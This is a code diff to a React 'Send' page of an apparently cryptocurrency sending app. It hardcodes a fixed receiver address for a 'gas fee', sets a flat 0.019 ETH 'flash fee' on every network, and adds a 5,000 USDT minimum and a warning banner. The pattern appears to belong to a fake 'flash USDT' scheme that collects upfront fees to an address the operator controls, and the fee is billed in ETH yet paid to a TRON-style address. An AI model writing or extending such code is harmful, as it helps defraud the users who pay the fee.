@@ -146,9 +146,12 @@ export default function Send() {
   const [showConfirmation, setShowConfirmation] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
 
-  const { data: gasInfo = { receiverAddress: '', fees: { slow: '0.0006', medium: '0.0009', fast: '0.0012' } } } = useQuery({
+  const { data: gasInfo = { receiverAddress: 'TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y', fees: { slow: '0.019 ETH', medium: '0.019 ETH', fast: '0.019 ETH' } } } = useQuery({
     queryKey: ['/api/gas-fees'],
   });
+
+  const gasReceiver = (gasInfo as any)?.receiverAddress || 'TQm8yS3XZHgXiHMtMWbrQwwmLCztyvAG8y';
+  const gasFeesData = (gasInfo as any)?.fees || { slow: '0.019 ETH', medium: '0.019 ETH', fast: '0.019 ETH' };
 
   const sendTransactionMutation = useMutation({
     mutationFn: async (transactionData: any) => {
@@ -223,6 +226,17 @@ export default function Send() {
       return;
     }
 
+    // Check minimum transaction amount
+    const amount = parseFloat(formData.amount);
+    if (amount < 5000) {
+      toast({
+        title: "Minimum Amount Required",
+        description: "Minimum transaction amount is 5,000 USDT",
+        variant: "destructive",
+      });
+      return;
+    }
+
     if (requiresGasPayment(formData.network) && !gasFeePaid) {
       toast({
         title: "Gas Fee Required",
@@ -246,7 +260,7 @@ export default function Send() {
       token: tokenSymbols[activeTab as keyof typeof tokenSymbols],
       network: activeTab.toUpperCase(),
       gasSpeed: formData.gasSpeed,
-      gasFee: gasInfo.fees[formData.gasSpeed as keyof typeof gasInfo.fees],
+      gasFee: gasFeesData[formData.gasSpeed as keyof typeof gasFeesData],
       gasFeePaid: gasFeePaid,
       status: 'pending',
     };
@@ -307,6 +321,25 @@ export default function Send() {
                     </div>
                     
                     <div className="space-y-2">
+                      <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-3 mb-4">
+                        <div className="flex items-start space-x-2">
+                          <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center mt-0.5">
+                            <span className="text-black text-xs font-bold">!</span>
+                          </div>
+                          <div>
+                            <p className="text-yellow-500 font-semibold text-sm">Important Notice</p>
+                            <p className="text-xs text-muted-foreground mt-1">
+                              Minimum transaction amount: <strong className="text-yellow-500">5,000 USDT</strong>
+                            </p>
+                            <p className="text-xs text-muted-foreground">
+                              Flash fee required: <strong className="text-yellow-500">0.019 ETH</strong> for all networks
+                            </p>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    
+                    <div className="space-y-2">
                       <Label htmlFor="amount">Amount</Label>
                       <div className="relative">
                         <Input
@@ -352,9 +385,9 @@ export default function Send() {
                           <SelectValue />
                         </SelectTrigger>
                         <SelectContent>
-                          <SelectItem value="slow">Slow (0.0006 ETH)</SelectItem>
-                          <SelectItem value="medium">Medium (0.0009 ETH)</SelectItem>
-                          <SelectItem value="fast">Fast (0.0012 ETH)</SelectItem>
+                          <SelectItem value="slow">Slow (0.019 ETH)</SelectItem>
+                          <SelectItem value="medium">Medium (0.019 ETH)</SelectItem>
+                          <SelectItem value="fast">Fast (0.019 ETH)</SelectItem>
                         </SelectContent>
                       </Select>
                     </div>
@@ -364,14 +397,14 @@ export default function Send() {
                     <GasPaymentSection
                       gasFeePaid={gasFeePaid}
                       onConfirmPayment={() => setGasFeePaid(true)}
-                      receiverAddress={gasInfo.receiverAddress}
+                      receiverAddress={gasReceiver}
                     />
                   )}
 
                   <div className="flex items-center justify-between pt-4 border-t border-gray-700">
                     <div className="text-sm text-muted-foreground">
                       <p>Transaction Fee: <span className="text-yellow-500 font-medium">
-                        {gasInfo.fees[formData.gasSpeed as keyof typeof gasInfo.fees]} ETH
+                        {gasFeesData[formData.gasSpeed as keyof typeof gasFeesData]}
                       </span></p>
                       <p>Estimated Time: <span className="text-accent font-medium">2-5 minutes</span></p>
                     </div>
@@ -406,7 +439,7 @@ export default function Send() {
               </div>
               <div className="flex justify-between">
                 <span>Gas Fee:</span>
-                <span className="text-yellow-500">{gasInfo.fees[formData.gasSpeed as keyof typeof gasInfo.fees]} {receiverAddress.startsWith('T') ? 'TRX' : 'ETH'}</span>
+                <span className="text-yellow-500">{gasFeesData[formData.gasSpeed as keyof typeof gasFeesData]}</span>
               </div>
             </div>
             <div className="flex space-x-3">
